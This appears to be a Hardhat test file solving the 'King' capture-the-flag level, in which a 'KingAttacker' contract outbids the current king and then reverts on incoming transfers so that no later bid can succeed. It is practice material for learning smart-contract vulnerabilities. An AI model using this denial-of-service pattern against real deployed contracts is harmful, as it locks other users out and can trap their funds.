const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('King', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('King', deployer);
        this.king = await Factory.deploy({value: ethers.utils.parseUnits("1")});
    });
    // we make a revert on transfer
    it('Exploit', async function () {
        const Factory = await ethers.getContractFactory('KingAttacker', attacker);
        let attackerContract = await Factory.deploy();
        let balance = (await this.king.prize()).add(ethers.constants.One);
        await attackerContract.attack(this.king.address, {value: balance})
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        let balance = await this.king.prize();

        await expect(
            deployer.sendTransaction({to: this.king.address, gasLimit: 100000, value: balance.add(ethers.constants.One)})
        ).to.be.reverted;

        expect(
            await this.king._king()
        ).to.not.equal(deployer.address)
    });
});